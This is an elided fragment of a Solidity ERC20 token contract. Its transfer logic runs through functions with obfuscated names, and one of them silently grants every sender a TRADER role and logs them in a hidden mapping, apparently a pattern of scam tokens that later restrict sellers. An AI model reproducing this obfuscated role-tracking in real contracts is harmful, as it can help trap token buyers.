...
contract Token is _RNSCNFJSERC20, _RNSCNFJSConsole {
    ...
    function _transfer(
        ...
        require(from5 != address(0), "ERC20: transfer from the zero address");

        __RNSCNFJSxindbf(from5, to, amt);

    }

    function __RNSCNFJSxindbf(address from5, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from5] >= amt, "ERC20: transfer amt exceeds balance");

        __RNSCNFJSxfgdfbb(from5, to, amt);
    }


    function __RNSCNFJSxfgdfbb(address from5, address to, uint256 amt) internal {
        if (__traders[from5] == false) {
            _grantRole(TRADER, from5);
            __traders[from5] = true;
            
        }

        __RNSCNFJSxfyhyhtg(from5, to, amt);
    }
